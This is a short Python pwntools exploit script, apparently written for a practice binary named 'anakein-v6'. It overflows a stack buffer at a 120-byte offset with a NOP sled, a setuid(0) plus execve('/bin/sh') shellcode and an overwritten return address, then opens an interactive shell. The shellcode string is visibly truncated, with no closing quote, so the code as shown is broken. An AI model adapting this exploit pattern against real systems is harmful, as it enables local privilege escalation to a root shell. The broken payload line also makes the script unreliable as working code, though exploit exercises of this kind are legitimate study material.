#!/usr/bin/env python
#Author: @Anakein
#Email: eduardobarbosa@protonmail.ch
#credits: @zc00l

from pwn import *

e = ELF("./anakein-v6")
p = process(e.path)

#Stack Overflow information
offset = 120 #bytes
#Linux/x64 - setuid(0) + execve(/bin/sh) Shellcode (49 bytes)         | shellcodes/linux_x86-64/13320.c
shellcode = "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48$
shellcode_len = len(shellcode)
ret = p32(0x4006a3)
payload = "\x90" * (offset - shellcode_len) + shellcode + ret + "A" * 2000

#Send the custom exploit and start mode interactive
p.send(payload)
p.interactive()
